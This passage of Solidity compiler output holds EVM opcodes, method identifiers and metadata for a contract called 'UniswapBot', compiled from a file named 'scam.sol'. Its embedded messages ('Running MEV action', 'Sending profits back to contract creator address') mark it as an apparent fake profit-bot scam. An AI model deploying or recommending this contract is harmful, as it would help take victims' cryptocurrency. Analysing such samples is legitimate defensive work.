											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "112"
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "MUL",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "CALLDATASIZE",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "CALLDATACOPY",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "tag",
											"source": 9,
											"value": "112"
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17144,
											"end": 17220,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 17144,
											"end": 17220,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17231,
											"end": 17253,
											"name": "PUSH",
											"source": 9,
											"value": "60"
										},
										{
											"begin": 17262,
											"end": 17271,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17231,
											"end": 17272,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 17231,
											"end": 17272,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17286,
											"end": 17292,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 17303,
											"end": 17309,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 17329,
											"end": 17330,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 17327,
											"end": 17330,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 17327,
											"end": 17330,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17323,
											"end": 17415,
											"name": "tag",
											"source": 9,
											"value": "113"
										},
										{
											"begin": 17323,
											"end": 17415,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 17334,
											"end": 17344,
											"name": "DUP6",
											"source": 9
										},
										{
											"begin": 17334,
											"end": 17351,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 17332,
											"end": 17333,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 17332,
											"end": 17351,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 17323,
											"end": 17415,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 17323,
											"end": 17415,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "114"
										},
										{
											"begin": 17323,
											"end": 17415,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 17390,
											"end": 17400,
											"name": "DUP6",
											"source": 9
										},
										{
											"begin": 17401,
											"end": 17402,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "116"
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "INVALID",
											"source": 9
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "tag",
											"source": 9,
											"value": "116"
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "PUSH",
											"source": 9,
											"value": "F8"
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "SHR",
											"source": 9
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "PUSH",
											"source": 9,
											"value": "F8"
										},
										{
											"begin": 17390,
											"end": 17403,
											"name": "SHL",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17382,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 17383,
											"end": 17386,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 17383,
											"end": 17386,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 17383,
											"end": 17386,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 17383,
											"end": 17386,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17383,
											"end": 17386,
											"name": "SWAP4",
											"source": 9
										},
										{
											"begin": 17383,
											"end": 17386,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17387,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17387,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17387,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17387,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17387,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "117"
										},
										{
											"begin": 17373,
											"end": 17387,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17387,
											"name": "INVALID",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17387,
											"name": "tag",
											"source": 9,
											"value": "117"
										},
										{
											"begin": 17373,
											"end": 17387,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17387,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 17373,
											"end": 17387,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17387,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17403,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17403,
											"name": "PUSH",
											"source": 9,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 17373,
											"end": 17403,
											"name": "NOT",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17403,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17403,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17403,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17403,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 17373,
											"end": 17403,
											"name": "BYTE",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17403,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17403,
											"name": "MSTORE8",
											"source": 9
										},
										{
											"begin": 17373,
											"end": 17403,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17353,
											"end": 17356,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17353,
											"end": 17356,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 17353,
											"end": 17356,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 17353,
											"end": 17356,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17353,
											"end": 17356,
											"name": "SWAP3",
											"source": 9
										},
										{
											"begin": 17353,
											"end": 17356,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17353,
											"end": 17356,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17323,
											"end": 17415,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "113"
										},
										{
											"begin": 17323,
											"end": 17415,
											"name": "JUMP",
											"source": 9
										},
										{
											"begin": 17323,
											"end": 17415,
											"name": "tag",
											"source": 9,
											"value": "114"
										},
										{
											"begin": 17323,
											"end": 17415,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 17434,
											"end": 17435,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 17432,
											"end": 17435,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 17432,
											"end": 17435,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17428,
											"end": 17522,
											"name": "tag",
											"source": 9,
											"value": "118"
										},
										{
											"begin": 17428,
											"end": 17522,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 17439,
											"end": 17450,
											"name": "DUP5",
											"source": 9
										},
										{
											"begin": 17439,
											"end": 17457,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 17437,
											"end": 17438,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 17437,
											"end": 17457,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 17428,
											"end": 17522,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 17428,
											"end": 17522,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "119"
										},
										{
											"begin": 17428,
											"end": 17522,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 17496,
											"end": 17507,
											"name": "DUP5",
											"source": 9
										},
										{
											"begin": 17508,
											"end": 17509,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "121"
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "INVALID",
											"source": 9
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "tag",
											"source": 9,
											"value": "121"
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "PUSH",
											"source": 9,
											"value": "F8"
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "SHR",
											"source": 9
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "PUSH",
											"source": 9,
											"value": "F8"
										},
										{
											"begin": 17496,
											"end": 17510,
											"name": "SHL",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17488,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 17489,
											"end": 17492,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 17489,
											"end": 17492,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 17489,
											"end": 17492,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 17489,
											"end": 17492,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17489,
											"end": 17492,
											"name": "SWAP4",
											"source": 9
										},
										{
											"begin": 17489,
											"end": 17492,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17493,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17493,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17493,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17493,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17493,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "122"
										},
										{
											"begin": 17479,
											"end": 17493,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17493,
											"name": "INVALID",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17493,
											"name": "tag",
											"source": 9,
											"value": "122"
										},
										{
											"begin": 17479,
											"end": 17493,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17493,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 17479,
											"end": 17493,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17493,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17510,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17510,
											"name": "PUSH",
											"source": 9,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 17479,
											"end": 17510,
											"name": "NOT",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17510,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17510,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17510,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17510,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 17479,
											"end": 17510,
											"name": "BYTE",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17510,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17510,
											"name": "MSTORE8",
											"source": 9
										},
										{
											"begin": 17479,
											"end": 17510,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17459,
											"end": 17462,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17459,
											"end": 17462,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 17459,
											"end": 17462,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 17459,
											"end": 17462,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17459,
											"end": 17462,
											"name": "SWAP3",
											"source": 9
										},
										{
											"begin": 17459,
											"end": 17462,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17459,
											"end": 17462,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17428,
											"end": 17522,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "118"
										},
										{
											"begin": 17428,
											"end": 17522,
											"name": "JUMP",
											"source": 9
										},
										{
											"begin": 17428,
											"end": 17522,
											"name": "tag",
											"source": 9,
											"value": "119"
										},
										{
											"begin": 17428,
											"end": 17522,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 17549,
											"end": 17558,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 17535,
											"end": 17559,
											"name": "SWAP7",
											"source": 9
										},
										{
											"begin": 17535,
											"end": 17559,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17535,
											"end": 17559,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17535,
											"end": 17559,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17535,
											"end": 17559,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17535,
											"end": 17559,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17535,
											"end": 17559,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17535,
											"end": 17559,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 16932,
											"end": 17567,
											"name": "SWAP3",
											"source": 9
										},
										{
											"begin": 16932,
											"end": 17567,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 16932,
											"end": 17567,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 16932,
											"end": 17567,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 16932,
											"end": 17567,
											"name": "JUMP",
											"source": 9,
											"value": "[out]"
										},
										{
											"begin": 13257,
											"end": 13347,
											"name": "tag",
											"source": 9,
											"value": "59"
										},
										{
											"begin": 13257,
											"end": 13347,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 13308,
											"end": 13312,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 13332,
											"end": 13339,
											"name": "PUSH",
											"source": 9,
											"value": "299978"
										},
										{
											"begin": 13325,
											"end": 13339,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 13325,
											"end": 13339,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 13257,
											"end": 13347,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 13257,
											"end": 13347,
											"name": "JUMP",
											"source": 9,
											"value": "[out]"
										},
										{
											"begin": 16543,
											"end": 16631,
											"name": "tag",
											"source": 9,
											"value": "61"
										},
										{
											"begin": 16543,
											"end": 16631,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 16593,
											"end": 16597,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 16617,
											"end": 16623,
											"name": "PUSH",
											"source": 9,
											"value": "CD4B5"
										},
										{
											"begin": 16610,
											"end": 16623,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 16610,
											"end": 16623,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 16543,
											"end": 16631,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 16543,
											"end": 16631,
											"name": "JUMP",
											"source": 9,
											"value": "[out]"
										},
										{
											"begin": 14763,
											"end": 15090,
											"name": "tag",
											"source": 9,
											"value": "107"
										},
										{
											"begin": 14763,
											"end": 15090,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 14815,
											"end": 14819,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 14841,
											"end": 14842,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 14836,
											"end": 14842,
											"name": "PUSH",
											"source": 9,
											"value": "FF"
										},
										{
											"begin": 14836,
											"end": 14842,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 14836,
											"end": 14837,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 14836,
											"end": 14842,
											"name": "GT",
											"source": 9
										},
										{
											"begin": 14836,
											"end": 14842,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 14836,
											"end": 14852,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 14836,
											"end": 14852,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 14836,
											"end": 14852,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "126"
										},
										{
											"begin": 14836,
											"end": 14852,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 14836,
											"end": 14852,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 14851,
											"end": 14852,
											"name": "PUSH",
											"source": 9,
											"value": "9"
										},
										{
											"begin": 14846,
											"end": 14847,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 14846,
											"end": 14852,
											"name": "PUSH",
											"source": 9,
											"value": "FF"
										},
										{
											"begin": 14846,
											"end": 14852,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 14846,
											"end": 14852,
											"name": "GT",
											"source": 9
										},
										{
											"begin": 14846,
											"end": 14852,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 14836,
											"end": 14852,
											"name": "tag",
											"source": 9,
											"value": "126"
										},
										{
											"begin": 14836,
											"end": 14852,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 14832,
											"end": 15023,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 14832,
											"end": 15023,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "127"
										},
										{
											"begin": 14832,
											"end": 15023,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 14900,
											"end": 14901,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 14887,
											"end": 14896,
											"name": "PUSH",
											"source": 9,
											"value": "3000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 14881,
											"end": 14897,
											"name": "PUSH",
											"source": 9,
											"value": "F8"
										},
										{
											"begin": 14881,
											"end": 14897,
											"name": "SHR",
											"source": 9
										},
										{
											"begin": 14881,
											"end": 14901,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 14876,
											"end": 14902,
											"name": "PUSH",
											"source": 9,
											"value": "F8"
										},
										{
											"begin": 14876,
											"end": 14902,
											"name": "SHL",
											"source": 9
										},
										{
											"begin": 14869,
											"end": 14902,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 14869,
											"end": 14902,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 14869,
											"end": 14902,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "125"
										},
										{
											"begin": 14869,
											"end": 14902,
											"name": "JUMP",
											"source": 9
										},
										{
											"begin": 14832,
											"end": 15023,
											"name": "tag",
											"source": 9,
											"value": "127"
										},
										{
											"begin": 14832,
											"end": 15023,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 14936,
											"end": 14937,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 14924,
											"end": 14938,
											"name": "PUSH",
											"source": 9,
											"value": "FF"
										},
										{
											"begin": 14924,
											"end": 14938,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 14924,
											"end": 14926,
											"name": "PUSH",
											"source": 9,
											"value": "A"
										},
										{
											"begin": 14924,
											"end": 14938,
											"name": "GT",
											"source": 9
										},
										{
											"begin": 14924,
											"end": 14938,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 14924,
											"end": 14956,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 14924,
											"end": 14956,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 14924,
											"end": 14956,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "129"
										},
										{
											"begin": 14924,
											"end": 14956,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 14924,
											"end": 14956,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 14954,
											"end": 14956,
											"name": "PUSH",
											"source": 9,
											"value": "F"
										},
										{
											"begin": 14948,
											"end": 14949,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 14942,
											"end": 14956,
											"name": "PUSH",
											"source": 9,
											"value": "FF"
										},
										{
											"begin": 14942,
											"end": 14956,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 14942,
											"end": 14956,
											"name": "GT",
											"source": 9
										},
										{
											"begin": 14942,
											"end": 14956,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 14924,
											"end": 14956,
											"name": "tag",
											"source": 9,
											"value": "129"
										},
										{
											"begin": 14924,
											"end": 14956,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 14920,
											"end": 15023,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 14920,
											"end": 15023,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "130"
										},
										{
											"begin": 14920,
											"end": 15023,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 15008,
											"end": 15010,
											"name": "PUSH",
											"source": 9,
											"value": "A"
										},
										{
											"begin": 15004,
											"end": 15005,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 14991,
											"end": 15000,
											"name": "PUSH",
											"source": 9,
											"value": "6100000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 14985,
											"end": 15001,
											"name": "PUSH",
											"source": 9,
											"value": "F8"
										},
										{
											"begin": 14985,
											"end": 15001,
											"name": "SHR",
											"source": 9
										},
										{
											"begin": 14985,
											"end": 15005,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 14985,
											"end": 15010,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 14980,
											"end": 15011,
											"name": "PUSH",
											"source": 9,
											"value": "F8"
										},
										{
											"begin": 14980,
											"end": 15011,
											"name": "SHL",
											"source": 9
										},
										{
											"begin": 14973,
											"end": 15011,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 14973,
											"end": 15011,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 14973,
											"end": 15011,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "125"
										},
										{
											"begin": 14973,
											"end": 15011,
											"name": "JUMP",
											"source": 9
										},
										{
											"begin": 14920,
											"end": 15023,
											"name": "tag",
											"source": 9,
											"value": "130"
										},
										{
											"begin": 14920,
											"end": 15023,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15074,
											"end": 15082,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 15074,
											"end": 15082,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15074,
											"end": 15082,
											"name": "REVERT",
											"source": 9
										},
										{
											"begin": 14763,
											"end": 15090,
											"name": "tag",
											"source": 9,
											"value": "125"
										},
										{
											"begin": 14763,
											"end": 15090,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 14763,
											"end": 15090,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 14763,
											"end": 15090,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 14763,
											"end": 15090,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 14763,
											"end": 15090,
											"name": "JUMP",
											"source": 9,
											"value": "[out]"
										}
									],
									".data": {
										"6350D1A48231284A8341DBB6CEC434401EEC03DD1DB1D0D6D2F253F7A8B3ECA6": "53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e",
										"9FB03945078BC6C7000C07D459687B271AE0ADC059777DEE3669B3C70B385107": "52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2e"
									}
								}
							}
						},
						"methodIdentifiers": {
							"debugBot()": "7d53d433",
							"debugMempool()": "e1812f05",
							"start()": "be9a6555",
							"withdrawal()": "d4e93292"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_mainTokenSymbol\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_mainTokenName\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"_msg\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"debugBot\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"debugMempool\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawal\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"scam.sol\":\"UniswapBot\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\":{\"keccak256\":\"0xcc3d0c93fc9ac0febbe09f941b465b57f750bcf3b48432da0b97dc289cfdc489\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://b9379ad954680c44a0bc523b314ae4c4da735f9fe1d02aa56ea5bdba6f1136f2\",\"dweb:/ipfs/Qm